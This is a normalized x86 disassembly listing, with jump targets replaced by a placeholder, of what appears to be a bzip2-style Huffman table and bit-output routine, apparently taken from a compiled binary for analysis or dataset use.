shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x36 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x38 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x3a ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x3c ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x3e ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x40 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x42 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x44 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x46 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x48 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x4a ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x4c ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x4e ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x50 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x52 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x54 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x56 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x58 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x5a ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x5c ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x5e ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov di [ ebx + ebp * 2 + 0x60 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ esp + 0x20 ]
mov di [ ebx + edi * 2 ]
and edi 0xffff
mov [ esp + 0x60 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ esp + 0x60 ]
shl edi 0x4
add edi esi
mov [ esp + 0x34 ] ax
shr eax 0x10
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov [ esp + 0x36 ] ax
mov [ esp + 0x38 ] cx
mov [ esp + 0x3c ] dx
shr ecx 0x10
shr edx 0x10
mov [ esp + 0x3a ] cx
mov [ esp + 0x3e ] dx
jmp r-xdata
push 0xbbb
call sub_402720
mov ebp [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
add esp 0x4
cmp ebp 0x4652
jle r-xdata
mov ecx [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
add edi ecx
mov ecx [ esp + eax * 4 + 0x44 ]
inc ecx
mov [ esp + 0x28 ] edi
mov [ esp + eax * 4 + 0x44 ] ecx
mov ecx [ esp + 0x1c ]
mov [ ecx + esi + 0x680 ] al
inc ecx
cmp edx 0x6
mov [ esp + 0x1c ] ecx
jne r-xdata
lea ecx [ esp + 0x34 ]
mov [ esp + 0x60 ] ecx
mov ecx [ esp + 0x60 ]
test edx edx
mov cx [ ecx ]
jle r-xdata
mov edx [ esp + 0x10 ]
xor edi edi
test ebp ebp
jle r-xdata
mov [ esp + eax + 0x28 ] al
inc eax
cmp eax ecx
jl r-xdata
xor eax eax
test ecx ecx
jle r-xdata
cmp ebp [ esp + 0x18 ]
jg r-xdata
mov edx [ esp + 0x18 ]
sub edx ebp
inc edx
cmp edx 0x32
jne r-xdata
mov edx [ esp + 0x60 ]
inc edi
add edx 0x2
mov [ esp + 0x60 ] edx
mov edx [ esp + 0x10 ]
cmp edi edx
jl r-xdata
mov [ esp + 0x24 ] ecx
mov eax edi
mov edx [ esp + 0x60 ]
add edx 0x2
dec eax
mov [ esp + 0x60 ] edx
mov [ esp + 0x24 ] eax
jne r-xdata
mov edi [ esp + 0x10 ]
and ecx 0xffff
lea eax [ esp + 0x34 ]
lea ecx [ ecx + esi + 0x9324 ]
test ecx ecx
jle r-xdata
mov al [ esp + 0x28 ]
mov edx [ esp + 0x18 ]
lea ebp [ edx + 0x1 ]
jmp r-xdata
lea ecx [ eax + 0x2c ]
lea edx [ ebx + ebp * 2 ]
mov eax ecx
shl eax 0x7
add eax ecx
mov ecx [ esp + 0x18 ]
sub ecx ebp
shl eax 0x1
inc ecx
lea ecx [ eax + 0x2c ]
mov eax ecx
shl eax 0x7
add eax ecx
xor ecx ecx
mov cx [ ebx + ebp * 2 ]
shl eax 0x1
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x2 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x4 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x6 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x8 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0xa ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0xc ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0xe ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x10 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x12 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x14 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x16 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x18 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x1a ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x1c ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x1e ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x20 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x22 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x24 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x26 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x28 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x2a ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x2c ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x2e ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x30 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x32 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x34 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x36 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x38 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x3a ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x3c ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x3e ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x40 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x42 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x44 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x46 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x48 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x4a ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x4c ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x4e ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x50 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x52 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x54 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x56 ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ esi + edx * 4 ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x58 ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x5a ]
add edx eax
lea ecx [ esi + edx * 4 ]
mov edx [ ecx ]
inc edx
mov [ ecx ] edx
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x5c ]
add ecx eax
mov edx [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc edx
mov [ ecx ] edx
xor edx edx
mov dx [ ebx + ebp * 2 + 0x5e ]
add edx eax
mov edi [ esi + edx * 4 ]
lea ecx [ esi + edx * 4 ]
inc edi
xor edx edx
mov [ ecx ] edi
xor ecx ecx
mov cx [ ebx + ebp * 2 + 0x60 ]
add ecx eax
mov ebp [ esi + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
inc ebp
mov [ ecx ] ebp
mov ecx [ esp + 0x20 ]
mov dx [ ebx + ecx * 2 ]
add edx eax
mov ecx [ esi + edx * 4 ]
lea eax [ esi + edx * 4 ]
mov edx [ esp + 0x18 ]
inc ecx
mov [ eax ] ecx
lea ebp [ edx + 0x1 ]
jmp r-xdata
mov edx [ esp + 0x60 ]
xor ecx ecx
mov cx [ edx ]
mov edx [ esp + 0x24 ]
cmp ecx edx
jge r-xdata
mov edx [ esp + 0x10 ]
movzx dx [ ecx ]
add [ eax ] dx
add ecx 0x102
add eax 0x2
dec edi
jne r-xdata
mov eax [ esp + 0x24 ]
lea ebp [ esi + 0x58 ]
xor ecx ecx
mov edx ebp
lea edx [ esi + 0x9930 ]
lea eax [ esi + 0x9324 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x60 ] eax
mov [ esp + 0x30 ] ecx
mov [ edi + esi + 0x4cd2 ] cl
inc edi
cmp edi ebp
mov [ esp + 0x28 ] al
jl r-xdata
inc ecx
mov dl al
mov al [ esp + ecx + 0x28 ]
mov [ esp + ecx + 0x28 ] dl
cmp [ esp + 0x60 ] al
jne r-xdata
mov ecx [ esi + 0x274 ]
mov edx [ esp + 0x10 ]
cmp ebp ecx
jge r-xdata
xor edi edi
mov di [ edx ]
add edx 0x2
add edi eax
mov ebp [ esi + edi * 4 ]
lea edi [ esi + edi * 4 ]
inc ebp
dec ecx
mov [ edi ] ebp
jne r-xdata
inc eax
cmp eax 0x10
jl r-xdata
mov [ esp + ecx + 0x34 ] 0x1
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x60 ]
mov edx [ esp + 0x24 ]
push eax
push edi
push ebp
push ecx
push edx
call sub_415040
mov edx [ esp + 0x74 ]
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x44 ]
add esp 0x14
add edx 0x102
add ecx 0x408
dec eax
mov [ esp + 0x60 ] edx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x30 ] eax
jne r-xdata
mov edx [ esp + 0x60 ]
mov cl [ esi + edi + 0x680 ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x60 ] cl
cmp cl al
mov ecx [ esp + 0x30 ]
je r-xdata
mov ecx [ esp + 0x10 ]
cmp [ eax + edx ] 0x0
je r-xdata
inc ecx
add edx 0x10
cmp ecx 0x10
jl r-xdata
mov eax [ esp + 0x14 ]
xor edi edi
xor ecx ecx
mov ebp 0x20
test eax eax
jle r-xdata
cmp eax ebp
jge r-xdata
mov edi eax
mov [ esp + ecx + 0x34 ] 0x0
xor eax eax
xor edi edi
mov eax [ esp + 0x14 ]
inc ecx
cmp ecx eax
jl r-xdata
mov ebp eax
push 0x0
push 0x1
jmp r-xdata
xor eax eax
mov al [ edx + ecx ]
cmp eax edi
jle r-xdata
cmp edi 0x11
jle r-xdata
mov al [ esp + edi + 0x34 ]
test al al
je r-xdata
xor eax eax
mov [ esp + 0x60 ] eax
push 0x1
push esi
call sub_4114a0
add esp 0xc
inc edi
cmp edi 0x10
jl r-xdata
cmp ebp 0x1
jge r-xdata
push 0xbbc
call sub_402720
add esp 0x4
inc eax
add ebp 0x10
cmp eax 0x10
mov [ esp + 0x60 ] eax
jl r-xdata
xor edi edi
push 0xbbd
call sub_402720
add esp 0x4
mov cl [ esp + eax + 0x34 ]
test cl cl
je r-xdata
mov edi [ esp + 0x10 ]
push edi
push 0x3
push esi
call sub_4114a0
mov ebp [ esp + 0x28 ]
push ebp
push 0xf
push esi
call sub_4114a0
add esp 0x18
test ebp ebp
jle r-xdata
push 0x0
push 0x1
jmp r-xdata
test edi edi
jle r-xdata
mov eax 0xffffb32e
lea edi [ esi + 0x4cd2 ]
sub eax esi
mov [ esp + 0x60 ] eax
cmp [ edi + ebp ] 0x0
je r-xdata
mov eax [ esp + 0x60 ]
push 0x1
push esi
call sub_4114a0
add esp 0xc
inc edi
cmp edi 0x10
jl r-xdata
xor ecx ecx
xor ebp ebp
lea eax [ esi + 0x680 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x60 ] ebp
mov [ esp + 0x24 ] eax
lea eax [ esi + 0x9324 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x60 ] eax
push 0x0
push 0x1
push esi
call sub_4114a0
mov ecx [ esp + 0x6c ]
mov eax [ esp + 0x28 ]
add esp 0xc
inc edi
add ecx edi
cmp ecx eax
jl r-xdata
push 0x1
push 0x1
push esi
call sub_4114a0
xor eax eax
add esp 0xc
mov al [ edi ]
inc ebp
cmp ebp eax
jl r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
cmp ecx eax
pop ebx
je r-xdata
lea edi [ ebp + 0x31 ]
cmp edi eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x18 ] edi
jl r-xdata
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x28 ]
add eax 0x102
dec ecx
mov [ esp + 0x60 ] eax
mov [ esp + 0x28 ] ecx
jne r-xdata
mov ebp [ esp + 0x60 ]
mov [ esp + 0x30 ] eax
mov al [ edi ]
xor ebp ebp
test al al
jbe r-xdata
mov edi [ esp + 0x10 ]
add esp 0x4c
retn
push 0xbbf
call sub_402720
add esp 0x4
mov eax [ esp + 0x10 ]
xor edx edx
mov dl [ ecx + esi + 0x680 ]
cmp edx eax
jl r-xdata
lea edi [ eax - 0x1 ]
mov [ esp + 0x18 ] edi
xor edx edx
mov dl [ eax ]
mov edi edx
push edi
push 0x5
push esi
call sub_4114a0
mov eax [ esp + 0x20 ]
add esp 0xc
test eax eax
jle r-xdata
xor eax eax
mov al [ ebp ]
cmp edi eax
jle r-xdata
push 0x2
push 0x2
push esi
call sub_4114a0
xor edx edx
add esp 0xc
mov dl [ ebp ]
inc edi
cmp edi edx
jl r-xdata
cmp [ esp + 0x10 ] 0x6
jne r-xdata
push 0xbbe
call sub_402720
add esp 0x4
push 0x0
push 0x1
push esi
call sub_4114a0
mov eax [ esp + 0x3c ]
add esp 0xc
inc ebp
dec eax
mov [ esp + 0x30 ] eax
jne r-xdata
push 0x3
push 0x2
push esi
call sub_4114a0
xor ecx ecx
add esp 0xc
mov cl [ ebp ]
dec edi
cmp edi ecx
jg r-xdata
cmp ebp edi
jg r-xdata
mov eax edi
sub eax ebp
inc eax
cmp eax 0x32
jne r-xdata
xor ecx ecx
mov cl [ ebp ]
cmp edi ecx
jge r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x24 ]
inc ecx
lea ebp [ edi + 0x1 ]
inc eax
mov [ esp + 0x60 ] ebp
mov [ esp + 0x14 ] ecx
mov [ esp + 0x24 ] eax
jmp r-xdata
mov eax [ esp + 0x18 ]
lea edi [ ebx + ebp * 2 ]
sub eax ebp
inc eax
mov [ esp + 0x60 ] eax
mov ecx [ esp + 0x14 ]
xor eax eax
mov al [ ecx + esi + 0x680 ]
lea ecx [ eax + 0x92 ]
add eax 0x26
mov edx ecx
shl edx 0x7
add edx ecx
mov ecx eax
shl ecx 0x7
lea edi [ esi + edx * 2 ]
mov edx [ esp + 0x60 ]
add ecx eax
mov ax [ ebx + edx * 2 ]
xor edx edx
lea ebp [ esi + ecx * 8 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x2 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x4 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x6 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x8 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0xa ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
mov ax [ ebx + eax * 2 + 0xc ]
and eax 0xffff
xor edx edx
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0xe ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x10 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x12 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x14 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x16 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
xor edx edx
mov ax [ ebx + eax * 2 + 0x18 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x1a ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
mov ax [ ebx + eax * 2 + 0x1c ]
and eax 0xffff
xor edx edx
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x1e ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x20 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x22 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
xor edx edx
